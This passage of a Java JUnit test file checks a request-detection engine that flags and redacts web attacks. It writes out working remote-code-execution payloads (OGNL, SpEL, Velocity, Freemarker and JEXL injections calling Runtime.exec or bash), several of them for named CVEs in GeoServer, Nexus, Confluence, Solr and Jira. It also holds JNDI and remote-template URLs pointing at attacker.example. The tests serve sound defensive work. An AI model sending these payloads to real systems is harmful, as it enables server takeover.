    assertEquals("x-api-version", result.orElseThrow().details().get("name"));
    assertEquals("rmi", result.orElseThrow().details().get("protocol"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("x-api-version"));
  }

  @Test
  void detectsH2ConsoleJndiDriverUrlConfiguration() {
    var jndiUrl = "ldap://attacker.example/Exploit";
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=javax.naming.InitialContext&url=ldap%3A%2F%2Fattacker.example%2FExploit",
            Map.of(
                "driver",
                List.of("javax.naming.InitialContext"),
                "url",
                List.of(jndiUrl)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("url", result.orElseThrow().details().get("name"));
    assertEquals("ldap", result.orElseThrow().details().get("protocol"));
    assertEquals(String.valueOf(jndiUrl.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("url"));
    assertEquals(
        "driver=javax.naming.InitialContext&url=[redacted]",
        result.orElseThrow().request().query());
  }

  @Test
  void detectsRequestExpressionParameter() {
    var expression =
        "(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,"
            + "#_memberAccess[\"allowStaticMethodAccess\"]=true,"
            + "@java.lang.Runtime@getRuntime().exec('id'))(meh)";
    var context =
        new RequestContext(
            "GET",
            "/ajax/example5.action",
            "age=1&name=" + expression,
            Map.of("age", List.of("1"), "name", List.of(expression)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("name", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("name"));
    assertTrue(result.orElseThrow().request().query().contains("name=[redacted]"));
  }

  @Test
  void detectsGeoServerCve202436401WfsValueReferenceExpressionParameter() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success1')";
    var encodedExpression =
        "exec(java.lang.Runtime.getRuntime()%2C%27touch%20%2Ftmp%2Fsuccess1%27)";
    var context =
        new RequestContext(
            "GET",
            "/geoserver/wfs",
            "service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites"
                + "&valueReference="
                + encodedExpression,
            Map.of(
                "service",
                List.of("WFS"),
                "version",
                List.of("2.0.0"),
                "request",
                List.of("GetPropertyValue"),
                "typeNames",
                List.of("sf:archsites"),
                "valueReference",
                List.of(expression)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("valueReference", result.orElseThrow().details().get("parameter"));
    assertEquals("xpath", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("valueReference"));
    assertTrue(result.orElseThrow().request().query().contains("valueReference=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsGeoServerCve202436401WfsValueReferenceXmlBodyExpressionParameter() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')";
    var body =
        """
        <wfs:GetPropertyValue service="WFS" version="2.0.0"
         xmlns:wfs="http://www.opengis.net/wfs/2.0">
          <wfs:Query typeNames="sf:archsites"/>
          <wfs:valueReference>%s</wfs:valueReference>
        </wfs:GetPropertyValue>
        """
            .formatted(expression);
    var context =
        new RequestContext(
            "POST",
            "/geoserver/wfs",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/xml"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.valueReference", result.orElseThrow().details().get("parameter"));
    assertEquals("xpath", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void ignoresBenignGeoserverWfsPropertyNameExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/geoserver/wfs",
            "service=WFS&request=GetPropertyValue&typeNames=sf:archsites&valueReference=name",
            Map.of(
                "service",
                List.of("WFS"),
                "request",
                List.of("GetPropertyValue"),
                "typeNames",
                List.of("sf:archsites"),
                "valueReference",
                List.of("name")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresXPathExpressionParameterOutsideOgcContext() {
    var expression = "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success1')";
    var context =
        new RequestContext(
            "GET",
            "/api/search",
            "valueReference=exec(java.lang.Runtime.getRuntime()%2C%27touch%20%2Ftmp%2Fsuccess1%27)",
            Map.of("valueReference", List.of(expression)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsConfluenceDelegatedOgnlExpressionParameter() {
    var label =
        "\\u0027+#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d"
            + ".internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})+\\u0027";
    var delegated =
        "@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',"
            + "(new freemarker.template.utility.Execute()).exec({\"id\"}))";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "label=" + label + "&x=" + delegated,
            Map.of("label", List.of(label), "x", List.of(delegated)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("label", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(label.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("label"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("x"));
    assertEquals("label=[redacted]&x=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsConfluenceWebworkUnicodeQueryStringExpressionParameter() {
    var expression =
        "\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027)"
            + ".newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val"
            + "(\\u0027var p = new java.lang.ProcessBuilder(\\u0022bash\\u0022,"
            + "\\u0022-c\\u0022,\\u0022id\\u0022);p.start()\\u0027)}+\\u0027";
    var context =
        new RequestContext(
            "POST",
            "/pages/doenterpagevariables.action",
            "queryString=" + expression,
            Map.of("queryString", List.of(expression)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("queryString", result.orElseThrow().details().get("parameter"));
    assertEquals("expression", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("queryString"));
    assertEquals("queryString=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignDelegatedOgnlExpressionParameter() {
    var label =
        "'+#request['.KEY_velocity.struts2.context'].internalGet('ognl')"
            + ".findValue(#parameters.x,{})+'";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "label=" + label + "&x=profile.displayName",
            Map.of("label", List.of(label), "x", List.of("profile.displayName")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresStandaloneDelegatedTemplateCommandWithoutOgnlBridge() {
    var delegated =
        "@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',"
            + "(new freemarker.template.utility.Execute()).exec({\"id\"}))";
    var context =
        new RequestContext(
            "POST",
            "/template/aui/text-inline.vm",
            "x=" + delegated,
            Map.of("x", List.of(delegated)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsOauthResponseTypeExpressionParameter() {
    var expression = "${T(java.lang.Runtime).getRuntime().exec('id')}";
    var encodedExpression = "%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D";
    var context =
        new RequestContext(
            "GET",
            "/oauth/authorize",
            "response_type=" + encodedExpression
                + "&client_id=acme&scope=openid&redirect_uri=http%3A%2F%2Ftest",
            Map.of(
                "response_type",
                List.of(expression),
                "client_id",
                List.of("acme"),
                "scope",
                List.of("openid"),
                "redirect_uri",
                List.of("http://test")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("response_type", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("response_type"));
    assertTrue(result.orElseThrow().request().query().contains("response_type=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsNexusCve202010204ExtDirectRoleExpressionBody() {
    var expression =
        "nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('touch /tmp/success')}";
    var body =
        "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"roles\":[\""
            + jsonString(expression)
            + "\"]}],\"type\":\"rpc\"}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.roles", result.orElseThrow().details().get("parameter"));
    assertEquals("el", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsNexusCve202010199RepositoryMemberExpressionBody() {
    var expression =
        "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('touch /tmp/success')}";
    var body = "{\"group\":{\"memberNames\":[\"" + jsonString(expression) + "\"]}}";
    var context =
        new RequestContext(
            "POST",
            "/service/rest/beta/repositories/go/group",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.memberNames", result.orElseThrow().details().get("parameter"));
    assertEquals("el", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsNexusCve20197238ExtDirectJexlFilterExpressionBody() {
    var expression =
        "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')";
    var body =
        "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"page\":1,"
            + "\"start\":0,\"limit\":50,\"sort\":[{\"property\":\"name\",\"direction\":\"ASC\"}],"
            + "\"filter\":[{\"property\":\"repositoryName\",\"value\":\"*\"},"
            + "{\"property\":\"expression\",\"value\":\""
            + jsonString(expression)
            + "\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("body.value", result.orElseThrow().details().get("parameter"));
    assertEquals("jexl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsStrutsFreemarkerExecuteOgnlParameter() {
    var expression =
        "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"])"
            + ".(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\"))"
            + ".(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\"))"
            + ".(#arglist.add(\"id\"))"
            + ".(#execute.exec(#arglist))}";
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "id=" + expression,
            Map.of("id", List.of(expression)),
            Map.of("user-agent", "JUnit", "content-type", "multipart/form-data"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter");
    assertEquals("id", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsJsonPatchExpressionPath() {
    var expression =
        "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{105,100}))"
            + "/lastname";
    var body = "[{\"op\":\"replace\",\"path\":\"" + expression + "\",\"value\":\"vulhub\"}]";
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_json_patch_expression");
    assertEquals("path", result.orElseThrow().details().get("field"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("bodyLength"));
  }

  @Test
  void detectsSpringCve20178046JsonPatchByteArrayCommandPath() {
    var expression =
        "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))"
            + "/lastname";
    var body = "[{\"op\":\"replace\",\"path\":\"" + expression + "\",\"value\":\"vulhub\"}]";
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_json_patch_expression");
    assertEquals("path", result.orElseThrow().details().get("field"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("bodyLength"));
  }

  @Test
  void ignoresBenignExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/ajax/example5.action",
            "name=%{profile.displayName}",
            Map.of("name", List.of("%{profile.displayName}")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJsonPatchPath() {
    var context =
        new RequestContext(
            "PATCH",
            "/customers/1",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json-patch+json"),
            "[{\"op\":\"replace\",\"path\":\"/lastname\",\"value\":\"vulhub\"}]");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNexusJsonMathExpressionWithoutRuntime() {
    var expression = "$\\B{233*233}";
    var body =
        "{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"roles\":[\""
            + jsonString(expression)
            + "\"]}],\"type\":\"rpc\"}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNexusExtDirectJexlFilterWithoutRuntime() {
    var expression = "asset.name == 'example.jar'";
    var body =
        "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"filter\":["
            + "{\"property\":\"expression\",\"value\":\""
            + jsonString(expression)
            + "\"},{\"property\":\"type\",\"value\":\"jexl\"}]}],\"type\":\"rpc\",\"tid\":8}";
    var context =
        new RequestContext(
            "POST",
            "/service/extdirect",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRuntimeExpressionBodyOutsideControlContext() {
    var expression =
        "$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6]"
            + ".invoke(null).exec('id')}";
    var body = "{\"roles\":[\"" + jsonString(expression) + "\"]}";
    var context =
        new RequestContext(
            "POST",
            "/api/notes",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignOauthResponseTypeExpressionParameter() {
    var context =
        new RequestContext(
            "GET",
            "/oauth/authorize",
            "response_type=%24%7B233*233%7D&client_id=acme&scope=openid&redirect_uri=http%3A%2F%2Ftest",
            Map.of(
                "response_type",
                List.of("${233*233}"),
                "client_id",
                List.of("acme"),
                "scope",
                List.of("openid"),
                "redirect_uri",
                List.of("http://test")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRequestExpressionParameterName() {
    var expressionName =
        "username[#this.getClass().forName(\"java.lang.Runtime\")"
            + ".getRuntime().exec(\"touch /tmp/success\")]";
    var encodedName =
        "username%5B%23this.getClass().forName(%22java.lang.Runtime%22)"
            + ".getRuntime().exec(%22touch%20%2Ftmp%2Fsuccess%22)%5D";
    var context =
        new RequestContext(
            "POST",
            "/users",
            encodedName + "=&password=&repeatedPassword=",
            Map.of(
                expressionName,
                List.of(""),
                "password",
                List.of(""),
                "repeatedPassword",
                List.of("")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("username", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
    assertTrue(result.orElseThrow().request().parameters().containsKey("username[redacted]"));
    assertTrue(!result.orElseThrow().request().parameters().containsKey(expressionName));
    assertTrue(result.orElseThrow().request().query().contains("username[redacted]=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("java.lang.Runtime"));
  }

  @Test
  void detectsStrutsRedirectExpressionParameterName() {
    var expressionName = "redirect:${#a=@java.lang.Runtime@getRuntime().exec('id')}";
    var encodedName =
        "redirect:%24%7B%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D";
    var context =
        new RequestContext(
            "GET",
            "/index.action",
            encodedName + "=1",
            Map.of(expressionName, List.of("1")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("redirect", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsStrutsDynamicMethodInvocationExpressionParameterName() {
    var expressionName =
        "method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
            + "#a=@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0])";
    var encodedName =
        "method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,"
            + "%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29";
    var context =
        new RequestContext(
            "GET",
            "/index.action",
            encodedName + "=1&cmd=id",
            Map.of(expressionName, List.of("1"), "cmd", List.of("id")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("method", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
  }

  @Test
  void detectsSpringBindingExpressionParameterName() {
    var expressionName = "_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"id\")).start()";
    var encodedName =
        "%5F%28new%20java.lang.ProcessBuilder%28%22bash%22%2C%22-c%22%2C%22id%22%29%29.start%28%29";
    var context =
        new RequestContext(
            "POST",
            "/hotels/booking",
            encodedName + "=vulhub",
            Map.of(expressionName, List.of("vulhub")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_parameter_name");
    assertEquals("_", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expressionName.length()),
        result.orElseThrow().details().get("expressionLength"));
    assertEquals(List.of("vulhub"), result.orElseThrow().request().parameters().get("_[redacted]"));
    assertTrue(!result.orElseThrow().request().parameters().containsKey(expressionName));
    assertEquals("_[redacted]=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignExpressionParameterName() {
    var context =
        new RequestContext(
            "POST",
            "/users",
            "username%5Baddress%5D=main&note=%25%7Bprofile.displayName%7D",
            Map.of(
                "username[address]",
                List.of("main"),
                "note",
                List.of("%{profile.displayName}")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRequestExpressionPath() {
    var decodedPath =
        "/${(#a=@org.apache.commons.io.IOUtils@toString("
            + "@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\"))"
            + ".(@com.opensymphony.webwork.ServletActionContext@getResponse()"
            + ".setHeader(\"X-Cmd-Response\",#a))}/";
    var encodedPath =
        "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28"
            + "%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29."
            + "%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/";
    var context =
        new RequestContext(
            "GET",
            encodedPath,
            "",
            Map.of(),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_path");
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(encodedPath.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals("/[redacted]", result.orElseThrow().request().uri());
    assertEquals("/[redacted]", result.orElseThrow().details().get("uri"));
  }

  @Test
  void ignoresBenignExpressionPath() {
    var context =
        new RequestContext(
            "GET",
            "/struts2-showcase/$%7B233*233%7D/actionChain1.action",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSolrCve201917558VelocityTemplateParameter() {
    var template =
        "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) "
            + "#set($ex=$rt.getRuntime().exec('id'))";
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=" + template,
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of(template)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("v.template.custom", result.orElseThrow().details().get("parameter"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("v.template.custom"));
    assertTrue(result.orElseThrow().request().query().contains("v.template.custom=[redacted]"));
  }

  @Test
  void detectsSolrCve201917558VelocityParameterTemplateLoaderEnable() {
    var body =
        """
        {
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_loader_enable");
    assertEquals(
        "body.params.resource.loader.enabled", result.orElseThrow().details().get("parameter"));
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresSolrResourceLoaderEnableWithoutParameterTemplates() {
    var body =
        """
        {
          "update-queryresponsewriter": {
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "solr.resource.loader.enabled": "true"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresParameterTemplateLoaderEnableWithoutTemplateEngineSignal() {
    var body =
        """
        {"name":"json","params.resource.loader.enabled":"true"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJiraContactAdministratorVelocityTemplateParameter() {
    var template =
        "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null)"
            + ".invoke(null, null).exec('whoami').toString()";
    var context =
        new RequestContext(
            "POST",
            "/secure/ContactAdministrators.jspa",
            "subject=" + template + "&details=v",
            Map.of("subject", List.of(template), "details", List.of("v")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("subject", result.orElseThrow().details().get("parameter"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("subject"));
    assertTrue(result.orElseThrow().request().query().contains("subject=[redacted]"));
  }

  @Test
  void ignoresBenignTemplateParameter() {
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=#set($title='hello')$title",
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of("#set($title='hello')$title")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsFreemarkerTemplatePayloadInJsonSqlBody() {
    var template =
        "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
            + " ${ex(\"id\")}'";
    var body = "{\"sql\":\"" + jsonString(template) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/jmreport/queryFieldBySql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("body.sql", result.orElseThrow().details().get("parameter"));
    assertEquals("freemarker", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsFreemarkerTemplatePayloadInStrongJsonTemplateField() {
    var template = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}";
    var body = "{\"templateBody\":\"" + jsonString(template) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("body.templateBody", result.orElseThrow().details().get("parameter"));
    assertEquals("freemarker", result.orElseThrow().details().get("engine"));
  }

  @Test
  void ignoresBenignTemplatePayloadInJsonSqlBody() {
    var body = "{\"sql\":\"select '${name}' as display_name\"}";
    var context =
        new RequestContext(
            "POST",
            "/jmreport/queryFieldBySql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresWeakTemplateBodyFieldOutsideTemplateContext() {
    var template = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            "{\"sql\":\"" + jsonString(template) + "\"}");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsTemplateSourceSensitiveFileInJsonBody() {
    var body =
        """
        {"contentId":"786458","macro":{"name":"widget","body":"","params":{
          "url":"https://www.viddler.com/v/23464dc6",
          "_template":". /web.xml"
        }}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json; charset=utf-8"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("body._template", result.orElseThrow().details().get("parameter"));
    assertEquals("sensitive-file", result.orElseThrow().details().get("targetType"));
    assertEquals("10", result.orElseThrow().details().get("valueLength"));
  }

  @Test
  void detectsRemoteTemplateSourceInJsonBody() {
    var body =
        "{\"macro\":{\"name\":\"widget\",\"params\":{\"_template\":\"https://attacker.example/poc.vm\"}}}";
    var context =
        new RequestContext(
            "POST",
